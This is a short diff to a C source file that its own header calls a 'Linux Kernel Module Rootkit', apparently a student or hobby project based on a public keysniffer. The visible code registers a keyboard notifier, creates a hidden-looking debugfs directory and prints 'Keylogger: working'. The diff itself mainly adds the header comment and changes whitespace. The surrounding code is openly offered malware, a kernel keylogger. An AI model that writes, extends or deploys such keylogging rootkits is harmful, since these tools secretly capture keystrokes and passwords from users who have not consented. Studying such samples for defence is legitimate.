@@ -1,3 +1,10 @@
+// logger.c
+// Alex Cater & Andrew Parker
+// 2019-12-11
+// Linux Kernel Module Rootkit
+// Based off of implementation on 
+// https://github.com/jarun/keysniffer.git
+
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -145,7 +152,6 @@ int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_para
 	return NOTIFY_OK;
 }
 
-///dev/input/event2
 static int run_keylogger(void)
 {
 	subdir = debugfs_create_dir("lkmr", NULL);
@@ -171,7 +177,7 @@ static int run_keylogger(void)
 	 */
 
 	register_keyboard_notifier(&keysniffer_blk);
-  printk("Keylogger: working\n");
+  	printk("Keylogger: working\n");
 	return 0;
 }
 
